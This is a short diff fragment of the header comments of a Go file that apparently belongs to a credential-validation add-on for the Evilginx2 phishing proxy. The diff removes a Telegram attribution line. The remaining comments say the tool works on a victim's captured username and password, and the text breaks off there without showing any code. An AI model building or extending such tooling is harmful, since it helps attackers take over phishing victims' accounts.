@@ -1,7 +1,6 @@
 // core/validator.go
 // Login Credential Validator for Evilginx2
 //
-// Telegram Edition by @officialmonsterz (https://t.me/officialmonsterz)
 //
 // WHAT THIS DOES (baby steps):
 //   After you capture a victim's username and password, this automatically
